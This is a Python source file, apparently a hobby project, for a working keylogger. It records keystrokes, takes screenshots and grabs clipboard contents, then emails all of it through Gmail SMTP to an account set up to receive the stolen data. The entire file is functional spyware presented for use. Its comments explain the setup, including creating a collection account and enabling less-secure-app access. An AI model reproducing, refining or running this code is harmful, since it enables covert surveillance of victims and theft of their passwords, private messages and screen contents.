#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jun  9 13:17:29 2020

@author: aditya
try:
        
    except AttributeError:
        print('special key {0} pressed'.format(
            key))
"""
#it is used for keystroke listener
from pynput import keyboard 
#it is used for sending mail
import smtplib
#it is used for attaching subject and body to the mail send
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
#it is used for checking whether we are connected to the internet
import socket
#to take screenshots
import autopy
#to get contents copied to the clipboard
import clipboard


subject ="here's your log master" #subject to add
'''
Check for internet
If the Ipaddress == 127.0.0.1 which is default ip address then the machine is 
not connected to the internet
else
connected
'''
IPaddress = socket.gethostbyname(socket.gethostname())
#to store the key
logs=[]
message =""
text =""


def on_press(key):
    global logs
    print('alphanumeric key {0} pressed'.format(key))
    k=str(key).replace("'","")
    if(k=="Key.backspace"):
        logs.pop()
    else:
        logs.append(k)
    if(len(logs)>15):
        write_file(logs)
        logs=[]
        
def write_file(logs):
    #print("in write_file")
    global message
    for k in logs:
        if(k.find("space")>0):
            k=" "
            message +=k
        elif(k.find("enter")>0):
            k="[ENTER]\n"
            message +=k
        elif(k.find("Key")==-1):
            message +=k
    send_mail()
    
def on_release(key):
    global logs
    if key == keyboard.Key.esc:
        if(logs):
            write_file(logs)
            logs=[]
        return False
    
def send_mail():
    global message,text
    
    
    sender = 'your email address'
    password = 'your password'
    
    
    '''create a new gmail account where keylogger will send the file to
    NOTE:
        You Have to enable this:
            allowing less secure apps to access your account
            (https://support.google.com/accounts/answer/6010255)
            refer this link
    '''
    
    #checking if the internet is connected or not
    
    if(IPaddress!='127.0.0.1'):
        print("connected")
        email_message = MIMEMultipart()
        email_message['Subject']=subject
        print(message)
        print(len(message))
        #attaching the contents of the file as body to the message
        email_message.attach(MIMEText(message, "plain"))
        take_screenshot()
        message=""
        filename = "screengrab.png"  # In same directory as script
        # Open file in binary mode
        with open(filename, "rb") as attachment:
            # Add file as application/octet-stream
            # Email client can usually download this automatically as attachment
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

            # Encode file in ASCII characters to send by email    
            encoders.encode_base64(part)

            # Add header as key/value pair to attachment part
            part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {filename}",
                    )
        email_message.attach(part)
        email_message.attach(MIMEText("\n", "plain"))
        get_clipboard()
        email_message.attach(MIMEText(text, "plain"))
        text=""
        #here converting it into a string so that it could se send as a message
        send=email_message.as_string()
        print(len(send))
        if(len(send)!=307):
            print('inside if')
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.starttls()
            s.login(sender, password)
            s.sendmail(sender,sender,send)
            send=''
            print("sent")
    else:
        print("not connected")
        

#take screenshot    
def take_screenshot():
      autopy.bitmap.capture_screen().save('screengrab.png') 

#get contents of clipboard      
def get_clipboard():
    global text
    text = "It contains clipboard contents" + "\n" + clipboard.paste()    
    

            
#to start the keylistener program
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()














